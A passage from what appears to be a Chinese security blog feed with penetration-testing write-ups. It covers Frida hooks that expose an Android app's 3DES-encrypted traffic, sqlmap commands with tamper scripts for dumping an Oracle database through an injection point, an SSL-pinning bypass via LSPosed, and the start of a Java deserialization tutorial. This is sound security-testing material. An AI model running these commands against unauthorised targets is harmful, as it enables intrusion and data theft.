class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> xxxDES3Util = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;cn.xxxx.encryption.xxxDES3Util&quot;</span>);</span><br><span class="line">    xxxDES3Util[<span class="string">&quot;encode&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.encode is called: str=<span class="subst">$&#123;str&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;encode&quot;</span>](str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.encode result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>成功进行 hook 程序无闪退，hook 结果如下，加密前和加密后的结果均已显示出来。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -UF -l test.js</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/40.png" data-caption="40"><img src="/../images/app/TracerPID/40.png" alt="40"></a></p><p>通过对比抓包软件数据包，可知输出中的加密结果与抓包的加密数据结果一致。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/41.png" data-caption="41"><img src="/../images/app/TracerPID/41.png" alt="41"></a></p><p>根据上图 hook 结果可知，未加密的数据为。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/42.png" data-caption="42"><img src="/../images/app/TracerPID/42.png" alt="42"></a></p><p>直接将未加密的包放到抓包软件重放，可绕过加密机制，输出结果亦为未加密的结果，后续的功能测试也能利用该方法进行测试。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/43.png" data-caption="43"><img src="/../images/app/TracerPID/43.png" alt="43"></a></p><p>根据上面的代码，跟进加密算法，查看具体的加密算法如何。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/44.png" data-caption="44"><img src="/../images/app/TracerPID/44.png" alt="44"></a></p><p>加密算法使用 3DES  desede&#x2F;CBC&#x2F;OKCS5Padding 模式。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/45.png" data-caption="45"><img src="/../images/app/TracerPID/45.png" alt="45"></a></p><p>继续利用 Jadx hook  encode() 和 decode() 查看具体输出情况。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -UF -l test.js</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> xxxDES3Util = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;cn.xxxx.encryption.xxxDES3Util&quot;</span>);</span><br><span class="line">    xxxDES3Util[<span class="string">&quot;encode&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.encode is called: str=<span class="subst">$&#123;str&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;encode&quot;</span>](str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.encode result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    xxxDES3Util[<span class="string">&quot;decode&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.decode is called: str=<span class="subst">$&#123;str&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;decode&quot;</span>](str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xxxDES3Util.decode result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>部分如下，数据包的请求及响应的加解密均可查看。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/46.png" data-caption="46"><img src="/../images/app/TracerPID/46.png" alt="46"></a></p><p>根据已知的信息，编写一个frida rcp 实现同步输出加解密数据包。</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理RPC调用的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="comment"># 如果message的类型是&#x27;send&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="comment"># 打印message的payload内容</span></span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&#x27;payload&#x27;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 打印整个message</span></span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于 hook 编码和解码方法的 JavaScript 代码</span></span><br><span class="line">hook_script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    // 获取目标类&#x27;cn.xxxx.encryption.xxxDES3Util&#x27;</span></span><br><span class="line"><span class="string">    var xxxDES3Util = Java.use(&quot;cn.xxxx.encryption.xxxDES3Util&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 重写&#x27;encode&#x27;方法的实现</span></span><br><span class="line"><span class="string">    xxxDES3Util.encode.overload(&quot;java.lang.String&quot;).implementation = function (input) &#123;</span></span><br><span class="line"><span class="string">        // 打印未加密的请求数据包</span></span><br><span class="line"><span class="string">        console.log(&quot;**************************************************** 请求数据包 ****************************************************\n&quot;);</span></span><br><span class="line"><span class="string">        console.log(&quot;未加密请求数据包：&quot; + input);</span></span><br><span class="line"><span class="string">        // 调用原始的&#x27;encode&#x27;方法并获取加密后的输出</span></span><br><span class="line"><span class="string">        var output = this.encode(input);</span></span><br><span class="line"><span class="string">        // 打印加密后的请求数据包</span></span><br><span class="line"><span class="string">        console.log(&quot;加密后请求数据包: &quot; + output);</span></span><br><span class="line"><span class="string">        // 返回加密后的数据包</span></span><br><span class="line"><span class="string">        return output;</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 重写&#x27;decode&#x27;方法的实现</span></span><br><span class="line"><span class="string">    xxxDES3Util.decode.overload(&quot;java.lang.String&quot;).implementation = function (input) &#123;</span></span><br><span class="line"><span class="string">        // 打印加密后的响应数据包</span></span><br><span class="line"><span class="string">        console.log(&quot;**************************************************** 响应数据包 ****************************************************\n&quot;);</span></span><br><span class="line"><span class="string">        console.log(&quot;加密后响应数据包: &quot; + input);</span></span><br><span class="line"><span class="string">        // 调用原始的&#x27;decode&#x27;方法并获取解密后的输出</span></span><br><span class="line"><span class="string">        var output = this.decode(input);</span></span><br><span class="line"><span class="string">        // 打印解密后的响应数据包</span></span><br><span class="line"><span class="string">        console.log(&quot;未加密响应数据包: &quot; + output);</span></span><br><span class="line"><span class="string">        // 返回解密后的数据包</span></span><br><span class="line"><span class="string">        return output;</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取USB设备</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入目标进程，替换为目标进程的名称或包名</span></span><br><span class="line">pid = device.spawn([<span class="string">&quot;cn.xxx.xxxx&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line"><span class="comment"># 等待进程启动</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 连接到指定进程</span></span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="comment"># 使用 hook_script 字符串作为脚本内容</span></span><br><span class="line">script = session.create_script(hook_script)</span><br><span class="line"><span class="comment"># 当脚本产生消息时会调用这个函数进行处理</span></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, on_message)</span><br><span class="line"><span class="comment"># 这将开始执行 hook 操作</span></span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Frida hook RPC is running. Press Ctrl+C to exit.&quot;</span>)</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/47.png" data-caption="47"><img src="/../images/app/TracerPID/47.png" alt="47"></a></p><h2 id="五、扩展"><a href="#五、扩展" class="headerlink" title="五、扩展"></a>五、扩展</h2><h3 id="1、刷入-Recovery"><a href="#1、刷入-Recovery" class="headerlink" title="1、刷入 Recovery"></a>1、刷入 Recovery</h3><p>这边利用利用搞机助手刷入，具体输入方式各自可根据自身设备选择。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/48.png" data-caption="48"><img src="/../images/app/TracerPID/48.png" alt="48"></a></p><p>在助手引导模式中选择刷入REC，若刷入成功，点击是后手机会自动进入 recovery 模式。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/49.png" data-caption="49"><img src="/../images/app/TracerPID/49.png" alt="49"></a></p><p>输入一个 password ，输入开机密码即可。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/50.jpg" data-caption="50"><img src="/../images/app/TracerPID/50.jpg" alt="50"></a></p><p>根据自己手机选择正确的 twrp ，笔者使用的是小米的 mix2s 所以对应支持的 twrp 下载地址为<a href="https://twrp.me/xiaomi/xiaomimimix2s.html%EF%BC%8C%E5%85%B6%E5%AE%83%E6%9C%BA%E5%99%A8%E8%87%AA%E8%A1%8C%E6%9F%A5%E8%AF%A2%E6%94%AF%E6%8C%81%E7%9A%84">https://twrp.me/xiaomi/xiaomimimix2s.html，其它机器自行查询支持的</a> twrp。</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/51.png" data-caption="51"><img src="/../images/app/TracerPID/51.png" alt="51"></a></p><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>最初的问题源自一个报错信息。通过分析这个报错信息,我们定位到了APP中的反调试机制。进一步深入了解了这种反调试手段的原理后找寻合适的方法来反反调试，最终初步解决了APP加密数据的问题。</p><h2 id="七、参考链接"><a href="#七、参考链接" class="headerlink" title="七、参考链接"></a>七、参考链接</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://zone.huoxian.cn/d/325-tracerpid</span><br><span class="line">https://www.sec4.fun/2021/04/16/bypassptrace/</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APP测试系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APP测试 </tag>
            
            <tag> 刷机 </tag>
            
            <tag> Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oracle 注入之 SQLmap 程序报错解决</title>
      <link href="/2024/03/19/Oracle%20%E6%B3%A8%E5%85%A5%E4%B9%8B%20SQLmap%20%E7%A8%8B%E5%BA%8F%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/"/>
      <url>/2024/03/19/Oracle%20%E6%B3%A8%E5%85%A5%E4%B9%8B%20SQLmap%20%E7%A8%8B%E5%BA%8F%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>文章实际价值并不高，测试手法也是经常使用的手法，其主要是为了提醒自己，当在遇到无法解决的问题时，多尝试其它的思路，遇到问题，解决问题，对任何事物保持开阔的思路。</p><h2 id="二、问题发现"><a href="#二、问题发现" class="headerlink" title="二、问题发现"></a>二、问题发现</h2><p>前段时间在测试中发现一个注入点，老选手单引号报错，双单引号闭合。</p><p><a data-fancybox="gallery" data-src="/../images/injection/oracle/sql-1.png" data-caption="sql-1"><img src="/../images/injection/oracle/sql-1.png" alt="sql-1"></a></p><p><a data-fancybox="gallery" data-src="/../images/injection/oracle/sql-2.png" data-caption="sql-2"><img src="/../images/injection/oracle/sql-2.png" alt="sql-2"></a></p><h2 id="三、测试过程"><a href="#三、测试过程" class="headerlink" title="三、测试过程"></a>三、测试过程</h2><p>于是乎 sqlmap 启动，可惜 Sqlmap 普通命令跑无法跑出数据表，得知数据库为 Oracle，报错 <code>unable to retrieve the database names</code> ，命令如下</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --tamper space2morecomment, apostrophemask.py --level 5 --risk 3 --random-agent --threads=5 --tables</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/injection/oracle/sql-3.png" data-caption="sql-3"><img src="/../images/injection/oracle/sql-3.png" alt="sql-3"></a></p><p>遇到问题，解决问题，启动 Google 搜索大法 <code>unable to retrieve the database names</code>，经过一番搜寻，多次尝试修改 sqlmap 命令，最终将命令修改为如下，也许有些命令是多余比如 space2morecomment ，因为目标为 oracle，但不影响使用，在实际中亦没有删掉，故这里保留一下。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --tamper space2morecomment, apostrophemask.py,between.py,equaltolike.py --level 5 --risk 3 --random-agent --threads=5 --hex --tables --banner --dbms=oracle</span><br></pre></td></tr></table></figure></div><br/><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">--space2morecomment：将空格替换为/**_**/ </span><br><span class="line">--apostrophemask.py：将 &#x27; 替换为其UTF-8全角等价字符 %EF%BC%87</span><br><span class="line">--between.py：将 between替换大于号 &gt;</span><br><span class="line">--equaltolike：将 like 代替等号</span><br><span class="line">--level 5：设置注入测试的级别为5，表示使用最高级别的测试。</span><br><span class="line">--risk 3：设置注入测试的风险为3，表示使用最高风险的测试。</span><br><span class="line">--random-agent：随机选择一个用户代理标头，以模拟不同的浏览器和操作系统。</span><br><span class="line">--threads=5：指定使用5个线程进行注入测试。</span><br><span class="line">--hex：使用十六进制编码注入数据。</span><br><span class="line">--tables：获取数据库中的表信息。</span><br><span class="line">--banner：显示目标数据库的横幅信息。</span><br><span class="line">--dbms=oracle：指定目标数据库管理系统为 Oracle</span><br></pre></td></tr></table></figure></div><blockquote><p>apostrophemask.py</p></blockquote><p><a data-fancybox="gallery" data-src="/../images/injection/oracle/image-20240319162213334.png" data-caption="image-20240319162213334"><img src="/../images/injection/oracle/image-20240319162213334.png" alt="image-20240319162213334"></a></p><blockquote><p>between.py</p></blockquote><p><a data-fancybox="gallery" data-src="/../images/injection/oracle/image-20240319162615060.png" data-caption="image-20240319162615060"><img src="/../images/injection/oracle/image-20240319162615060.png" alt="image-20240319162615060"></a></p><blockquote><p>equaltolike.py</p></blockquote><p><a data-fancybox="gallery" data-src="/../images/injection/oracle/image-20240319162705626.png" data-caption="image-20240319162705626"><img src="/../images/injection/oracle/image-20240319162705626.png" alt="image-20240319162705626"></a></p><p>最终跑出数据</p><p><a data-fancybox="gallery" data-src="/../images/injection/oracle/image-20240319164556948.png" data-caption="image-20240319164556948"><img src="/../images/injection/oracle/image-20240319164556948.png" alt="image-20240319164556948"></a></p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMAP </tag>
            
            <tag> ORACLE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP测试系列- APP测试过程抓包小问题记录</title>
      <link href="/2024/03/19/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-APP%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B%E6%8A%93%E5%8C%85%E5%B0%8F%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/03/19/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-APP%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B%E6%8A%93%E5%8C%85%E5%B0%8F%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>继续接力 APP 的测试，记录测试过程中遇到抓包的小问题，篇幅如下。</p><h2 id="二、具体问题"><a href="#二、具体问题" class="headerlink" title="二、具体问题"></a>二、具体问题</h2><p>测试应用 Android APP，当正常使用系统设置 wifi 代理时，进入 APP 界面提示报错 “请求失败，java.security.cert.CertPathValidatorException:Trust anchor for certification path not found”，无法正常进行抓包。根据报错提示，大概知道是证书类的问题，尝试使用 Objection 绕过 SSLPinning 无法抓取数据包，APP 提示 network error。</p><p><a data-fancybox="gallery" data-src="/../images/mobile/xposed/https/1.png" data-caption="1"><img src="/../images/mobile/xposed/https/1.png" alt="1"></a></p><p>继续尝试 frida 脚本绕过，但报错 syntax error,expect start with { or [,but actually start with error，提示语法错误，此前一直使用该脚本进行测试没有出现过此类的报错。</p><p><a data-fancybox="gallery" data-src="/../images/mobile/xposed/https/2.png" data-caption="2"><img src="/../images/mobile/xposed/https/2.png" alt="2"></a> </p><h2 id="三、解决方案"><a href="#三、解决方案" class="headerlink" title="三、解决方案"></a>三、解决方案</h2><p>后面使用小黄鸟发现可抓包，但个人使用起来不太顺手，最终通过筛选选择使用 Xposed 框架中的 JustTrustMePP 进行绕过，项目地址：<a href="https://github.com/JunGe-Y/JustTrustMePP/blob/master/app/release/app-release.apk">https://github.com/JunGe-Y/JustTrustMePP/blob/master/app/release/app-release.apk</a></p><p>1）手机需要 root，然后安装 Magisk v21+，这一步就不多说了，自行准备设备，本人 Magisk 版本为 26.1，然后安装 Zygisk-LSPosed 实现 Xposed，下载地址：<a href="https://github.com/LSPosed/LSPosed">https://github.com/LSPosed/LSPosed</a> ，下载后直接在模块处选择安装后重启设备即可。</p><p><a data-fancybox="gallery" data-src="/../images/mobile/xposed/https/xposed.jpg" data-caption="xposed"><img src="/../images/mobile/xposed/https/xposed.jpg" alt="xposed"></a></p><p>2）安装完毕后，在通知栏中会出现 LSPosed 管理器，用于管理 Xposed 中的插件。</p><p><a data-fancybox="gallery" data-src="/../images/mobile/xposed/https/3.png" data-caption="3"><img src="/../images/mobile/xposed/https/3.png" alt="3"></a></p><p>3）安装  JustTrustMePP.apk ，下载地址：<a href="https://github.com/JunGe-Y/JustTrustMePP/blob/master/app/release/app-release.apk">https://github.com/JunGe-Y/JustTrustMePP/blob/master/app/release/app-release.apk</a> 下载完安装即可，然后在手机通知栏处进入 LSPosed 管理器管理该插件，进入  JustTrustMe++ 选择需要使用该插件的 APP 即可绕过证书验证，抓取 https。</p><blockquote><p>该 JustTrustMePP 主要解决的是用了Okhttp 且被混淆的 app，通过 hook okhttp 在验证证书之前必须用到的类，然后通过这个类的调用堆栈，去识别 okhttp 的相关类，从而实现跳过证书验证。</p></blockquote><p><a data-fancybox="gallery" data-src="/../images/mobile/xposed/https/4.png" data-caption="4"><img src="/../images/mobile/xposed/https/4.png" alt="4"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/xposed/https/5.png" data-caption="5"><img src="/../images/mobile/xposed/https/5.png" alt="5"></a></p><h2 id="四、后记"><a href="#四、后记" class="headerlink" title="四、后记"></a>四、后记</h2><p>测试完毕后进行复盘时，发现其中一设备重新使用 Objection 后惊奇发现可以进行绕过抓包，当时测试期间使用了两台设备 Objection 均无法绕过，只能说命运弄人，测试完毕才正常可抓。</p>]]></content>
      
      
      <categories>
          
          <category> APP测试系列 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 抓包 </tag>
            
            <tag> Okhttp </tag>
            
            <tag> https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计(八)-反序列化漏洞案例调试分析</title>
      <link href="/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"/>
      <url>/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>本文为 Java 反序列化漏洞案例调试分析学习文章，主要内容为通过已披露的信息结合 Poc 定位漏洞利用链并进行回溯分析，重思路向。</p><h2 id="二、前置知识"><a href="#二、前置知识" class="headerlink" title="二、前置知识"></a>二、前置知识</h2><h3 id="Java-序列化与反序列化"><a href="#Java-序列化与反序列化" class="headerlink" title="Java 序列化与反序列化"></a>Java 序列化与反序列化</h3><p><code>Java 序列化</code> 是指把 Java <code>对象</code>转换为<code>字节序列</code>的过程，便于保存在内存、文件、数据库中，如<code>ObjectOutputStream</code> 类的 <code>writeObject()</code> 方法可以实现序列化。</p><p><code>Java反序列化</code> 是指把<code>字节序列</code>恢复为 Java <code>对象</code> 的过程，如<code>ObjectInputStream</code> 类的 <code>readObject()</code> 方法用于反序列化。简单案例如下：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 定义obj对象</span></span><br><span class="line">        String obj=<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line">        FileOutputStream fos=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object_test&quot;</span>);</span><br><span class="line">        ObjectOutputStream os=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        <span class="comment">// writeObject()方法将obj对象写入object文件</span></span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">// 从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object_test&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        String obj2=(String)ois.readObject();</span><br><span class="line">        System.out.print(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230812153527991.png" data-caption="image-20230812153527991"><img src="/../images/Java/deserialization/image-20230812153527991.png" alt="image-20230812153527991"></a></p><blockquote><p>序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储：</p><p>1）把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；<br>2）在网络上传送对象的字节序列接收方接收到字符序列后，使用反序列化从字节序列中恢复出Java对象；</p></blockquote><h3 id="序列化-x2F-反序列化方法"><a href="#序列化-x2F-反序列化方法" class="headerlink" title="序列化&#x2F;反序列化方法"></a>序列化&#x2F;反序列化方法</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、writeObject() ： 为 ObjectOutputStream 类中的一个方法，用于将对象序列化并写入输出流的函数。它是在实现了 java.io.Serializable 接口的类中定义的。当你调用 writeObject() 方法并将一个对象作为参数传递给它时，该对象的状态将被序列化并写入输出流中。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、writeUnshared()：该方法与 writeObject() 类似，用于将对象进行序列化并写入输出流中。不同之处在于，writeUnshared() 